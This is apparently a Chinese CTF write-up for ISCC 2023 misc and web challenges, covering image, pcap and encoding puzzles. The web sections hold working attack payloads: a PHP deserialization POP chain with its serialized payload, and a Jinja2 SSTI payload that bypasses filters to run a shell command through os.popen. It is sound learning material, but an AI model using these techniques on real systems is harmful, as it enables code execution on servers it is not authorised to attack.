[TOC]



## 【ISCC1】



### misc

#### 好看的维吾尔族小姐姐

> 五十六个民族，五十六支花，五十六个兄弟姐妹是一家。现如今，民族团结的思想早已深入人心，而维吾尔族又是中华民族的重要组成部分，解决本题需要各位解题人知晓维吾尔族同胞的说话方式。

将图片该高度，获得一张类似二维码的图片，将图片水平反转一下，然后扫码(换了好几个网站)得到逆序的`html实体编码`，反过来，然后解码，得到flag

<img src="https://s2.loli.net/2023/05/02/JtiokejqO3QhHLz.png" alt="Untitled" style="zoom:33%;" />

<img src="https://s2.loli.net/2023/05/02/ZImqbYPCzi6f9rT.png" alt="image-20230502085711415" style="zoom:33%;" />





#### 菜鸟黑客1











#### 消息传递

在`pcapng`文件的**smtp协议**中分析分离出来一个rar压缩包

<img src="https://s2.loli.net/2023/05/02/kA8Veg2O7EiaJmp.png" alt="image-20230502093946329" style="zoom:33%;" />

但不知道密码，

![image-20230502094111429](https://s2.loli.net/2023/05/02/SwVusl7LNQ8JGqY.png)

这两个拼起来就是密码，解压一下：

![image-20230502094134077](https://s2.loli.net/2023/05/02/7k2KjH8gxsmoI19.png)

这是二进制，我们写脚本：

```python
import os
from PIL import Image

b = ""

for i in range(1, 113):
    name = str(i) + ".png"
    path = os.path.join("C://Users/LIKE/Desktop/picture", name)
    img = Image.open(path)
    value = img.getpixel((0, 0))
    if "255" in str(value):
        b += "0"
    else:
        b += "1"


for i in range(0, 112, 8):
    num = b[i:i+8]

    n = int(num, 2)

    print(chr(n), end="")
    
# ISCC{i2s0c2c3}
```

然后使用字典替换一下字符即可



#### 你相信AI吗？

在文件夹中新建一个out文件夹，然后使用脚本，

先跑一下这个脚本：main1.py

```python
import cv2
import numpy as np


for i in range(32):
    with open(f"./dataset/{i}.txt", "r") as f:
        data = f.read().splitlines()


    image_data = np.array([float(line) for line in data])

    # dic = {X: int(image_data.shape[0] / X) for X in range(1, image_data.shape[0]) if image_data.shape[0] % X == 0}


    # for width, height in dic.items():
    if image_data.shape[0] == 2352:
        cv2.imwrite(f"./out/{i}.png", image_data.reshape(84, 28))
    elif image_data.shape[0] == 1568:
        cv2.imwrite(f"./out/{i}.png", image_data.reshape(56, 28))
    else:
        print(i)
```

跑完了就在out文件夹中生成了很多数字图片，然后我们在跑一个脚本：

main2.py:

```python
import string
import itertools
import contextlib


def has_visible_bytes(input_bytes):
    return all(chr(byte) in string.printable for byte in input_bytes)

cipher_text = '51 59 75 95 56 46 669 70 28 687 78 59 51 05 02 684 28 50 99 55 686 685 99 687 53 05 75 27 683 56 96 96'.split(" ")
# 需要人眼OCR以下out文件夹内的输出
# cipher_text = '所有图像的ascii,空格隔开,上面的那行数字动态的'.split(" ")

with open("out.txt", "wb") as f:
    for i in itertools.permutations("0123456789", 10):
        maktrans = str.maketrans("0123456789", ''.join(i))

        lis = [str.translate(i, maktrans) for i in cipher_text]
        
        with contextlib.suppress(Exception):
            plan_text = bytes(list(map(lambda x: int(x), lis)))
            if has_visible_bytes(plan_text):
                print(plan_text)
                f.write(plan_text + b"\n")
```

注意要将out文件夹中图片的值填入：`cipher_text`

跑一下脚本，生成很多字符串，我们寻找 `ISCC`的base64编码：`SVNDQ`

<img src="https://s2.loli.net/2023/05/03/y2wul5A4bfvB3co.png" alt="img" style="zoom:33%;" />

base64解码得到flag



### web

#### 羊了个羊

![image-20230503103212443](https://s2.loli.net/2023/05/03/ubaCNdI6t2zJ3X8.png)

在 `/vue.global.js`中找到了flag



#### ISCC疯狂购物节-1









#### Where_is_your_love

![image-20230506170416621](https://s2.loli.net/2023/05/06/7T5Oniu9PpcBawd.png)

在html中发现三个php文件，我们访问：`LoveStory.php`

```php
<?php
include("./xxxiscc.php");
class boy {
    public $like;
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";
        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);  
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($string) {
        $this->string = $string;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {
        echo "僚机不懈努力<br>";
        $var = $this->$name;
        $var[$name]();
    }
}
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}

if (isset($_GET["iscc"])) {
    $a=unserialize($_GET['iscc']);
} else {
    highlight_file(__FILE__);
}
```

这是一个反序列化pop链构造，突破点在`love_story类`  

我们先好好分析love()方法：


首先需要知道`array_walk()` 

> `array_walk()` 函数对数组中的每个元素应用回调函数。如果成功则返回 TRUE，否则返回 FALSE。
>
> 典型情况下 *myfunction* 接受两个参数。*array* **参数的值作为第一个**，**键名作为第二个**。如果提供了可选参数 *userdata* ，将被作为第三个参数传递给回调函数。

例如：

![image-20230506171038419](https://s2.loli.net/2023/05/06/W4Xm36SdQbG25vj.png)



```php
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}
```

于是，`array_walk($this, function($make, $colo)`的意思就是

当前对象的属性中选择一个属性名为：`fall_in_love`并且值为一个数组，数组的第0个元素值为：`girl_and_boy`



但是我们如何才能调用`love方法`呢？

我们看到了`helper`类的 `__get()`方法，当调用对象不存在的属性会自动调用该方法，并且属性名传参给 `$name` 

```php
public function __get($name) {
        echo "僚机不懈努力<br>";
        $var = $this->$name;
        $var[$name]();
    }
```

我们重点关注：`$var[$name](); ` 

如果变为： `array(new love_story(),"love")()`,意思是调用love_story类中名为：`love`的函数：

![image-20230506172451322](https://s2.loli.net/2023/05/06/34maPxbuDQ52GY1.png)

如何做到呢？

我们先关注一下helper类中的私有变量：

```php
private $name;
private $string;
```

然后分析：boy类：

```php
public function __toString() {
        echo "拱火大法好<br>";
        return $this->like->string;  # 如果$this->like是helper对象
    }
```

这个方法会触发 helper类的 `__get()`方法，并且方法中`形参 $name=string`

这样的话，

```php
public function __get($name) { # $name="string"
        echo "僚机不懈努力<br>";
        $var = $this->$name;   # $this->string
        $var[$name]();
    }
```

如果 `$var = $this->string=array('string'=>array($love,'love'))`

那么：`$var[$name]=$var["string"] =  array($love,'love')`

这样  `array($love,'love')()`就回调了love函数





```php
<?php

class boy {
    public $like;
    public function __construct($li){
        $this->like=$li;
    }
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";
        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __construct($boy){
        $this->boyname=$boy;
    }
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($string,$na) {
        $this->string = $string;
        $this->name=$na;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {
        echo "僚机不懈努力<br>";
        $var = $this->$name;
        $var[$name]();
    }
}
class love_story {
    public $fall_in_love=["girl_and_boy"];

    public function love() {
        echo "爱情萌芽<br>";
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}

$love = new love_story();

$helper2 = new helper(array('string'=>array($love,'love')),'1');
$boy2 = new boy($helper2);
$h = new helper('1',$boy2);
$g = new girl($h);
$b = new boy($g);


echo urlencode(serialize($b));


O%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A4%3A%22girl%22%3A1%3A%7Bs%3A13%3A%22%00girl%00boyname%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A12%3A%22%00helper%00name%22%3BO%3A3%3A%22boy%22%3A1%3A%7Bs%3A4%3A%22like%22%3BO%3A6%3A%22helper%22%3A2%3A%7Bs%3A12%3A%22%00helper%00name%22%3Bs%3A1%3A%221%22%3Bs%3A14%3A%22%00helper%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A10%3A%22love_story%22%3A1%3A%7Bs%3A12%3A%22fall_in_love%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22girl_and_boy%22%3B%7D%7Di%3A1%3Bs%3A4%3A%22love%22%3B%7D%7D%7D%7Ds%3A14%3A%22%00helper%00string%22%3Bs%3A1%3A%221%22%3B%7D%7D%7D
```

get传参：

```
能请你喝杯奶茶吗？
我害羞羞
僚机上线
拱火大法好
僚机不懈努力
爱情萌芽
坠入爱河，给你爱的密码
e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e13e3e3404
```

得到一个密码



然后我们分析之前得到的两个文件

进行解密（不会解）：

```php
b'\x02\xa8\xbe$\x1d~\xc2\x18U*\xf2\x03i\x00<?php\r\nfunction enc($data){\r\n    $str="";\r\n    $a=strrev(str_rot13($data));\r\n    for($i=0;$i<strlen($a);$i++){\r\n        $b=ord($a[$i])+10;\r\n        $c=$b^100;\r\n        $e=sprintf("%02x",$c);\r\n        $str.=$e;\r\n    }\r\n    return $str;\r\n}\r\n?>'
```

然后叫chatgpt解密：

```php
<?php
function dec($data)
{
    $str = "";
    for ($i = 0; $i < strlen($data); $i += 2) {
        $c = hexdec(substr($data, $i, 2));
        $b = ($c ^ 100) - 10;
        $str .= chr($b);
    }
    return str_rot13(strrev($str));
}

echo dec("e35a31342f241b3f17081ae75e042b5f155e38163d285826e41936125b5a075910e13e3e3404");
```

解密密文就是之前获得的密码

![image-20230506220655514](https://s2.loli.net/2023/05/06/ATb3SLN97oXU2tf.png)





#### ChatGGG

SSTI

```jinja2
{% set x="\x5f" %}
{% set c=x~x~"cla"~"ss"~x~x %}
{% set glo=x~x~"glo"~"bals"~x~x %}
{% set geti=x~x~"get"~"item"~x~x %}
{% set buil=x~x~"buil"~"tins"~x~x %}
{% set im=x~x~"imp"~"o"~"rt"~x~x %}
{% set lip=(lipsum|attr(glo)|attr(geti))(buil) %}
{% set oo=((lip|attr(geti))(im))("os") %}
{% print(oo|attr("popen")("ls")|attr("read")()) %}
```

过滤了下划线、单引号、点、一些关键字。

我们使用编码绕过下划线过滤，使用双引号、点可以使用管道符`|`绕过

使用`?`正则代替小数点获取文件名

![image-20230510170549979](https://s2.loli.net/2023/05/10/yPXm9Q8iSDMsE1t.png)















